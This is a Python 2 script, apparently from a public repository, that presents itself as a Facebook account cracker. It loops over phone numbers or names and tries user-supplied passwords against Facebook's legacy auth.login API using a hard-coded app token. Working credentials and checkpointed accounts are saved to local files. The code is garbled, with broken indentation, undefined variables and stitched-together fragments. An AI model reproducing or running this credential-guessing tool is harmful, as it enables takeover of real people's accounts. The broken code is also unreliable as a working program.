#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import cookielib
import random
import mechanize
import os


firstname = []
id = []
listpass = []
username = []
nam = []

##### LOGO #####
logo = """\033[1;93m_/﹋\_          
\033[1;34m(🌀🌀)\033[0m
\033[1;36m<,︻╦╤─ ҉ ------------\033[0m \033[1;93m*Crack Facebook*\033[0m
\033[1;36m_/﹋\_\033[0m
\033[1;31m╔════════════════════════════════════════╗
\033[1;31m║ \033[1;93m*Author :\033[0m \033[1;97mUPIL FACEBOOK \033[0m               \033[1;31m║
\033[1;31m║ \033[1;93m*Github :\033[0m \033[1;34mhttps://github.com/aryhas\033[0m    \033[1;31m║
\033[1;31m╚════════════════════════════════════════╝\033[0m"""


os.system('clear')
print logo
print
print 42*"\033[1;96m="
firstname = str(raw_input("\033[1;96m[+] \033[1;93mNama Depan FB \033[1;97m: "))
passwordlist = str(raw_input("\033[1;96m[+] \033[1;93mWordlist \033[1;97m: "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]


			
	xxx = str(len(id))
	print ('\033[1;96m[✓] \033[1;93mTotal Nomor: \033[97m'+xxx)
	time.sleep(0.1)
	pass1 = raw_input("\033[1;96m[1] \033[1;93mPassword \033[1;91m: \033[1;97m")
	pass3 = raw_input("\033[1;96m[2] \033[1;93mPassword \033[1;91m: \033[1;97m")
	pass8 = raw_input("\033[1;96m[3] \033[1;93mPassword \033[1;91m: \033[1;97m")
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	print "\033[96m| 😎 | " + 3*" " + "\033[35mNOMOR HP" + 4*" " + "\033[96m|" + 5*" " + "\033[33mPassword" + 8*" " + "\033[96m"
	print 42*"\033[1;96m="
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass1
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'|'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass1
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'|'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
				else:
					pass2 = user
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass2
						okb = open('save/successfull.txt', 'a')
						okb.write(k+c+user+'|'+pass2+'\n')
						okb.close()
						oks.append(c+user+pass2)
					else:
						if 'www.facebook.com' in q['error_msg']:
							print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass2
							cps = open('save/checkpoint.txt', 'a')
							cps.write(k+c+user+'|'+pass2+'\n')
							cps.close()
							cpb.append(c+user+pass2)


		
#welcome 
def welcome():
	wel = """+=========================================+
|..........   Facebook Crack   ...........|
+-----------------------------------------+
|            #Author: UPIL FACEBOOK              | 
|	       Version 1.0                |
|   https://github.com/aryhas             |
+=========================================+
|..........  Facebook Cracker  ...........|
+-----------------------------------------+\n\n
"""
	print wel 
	print " [*] Account to crack : {}".format(firstname)
	print " [*] Loaded :" , len(listpass)
	print " [*] Cracking, please wait ...\n\n"

	
if __name__ == '__main__':
	main()
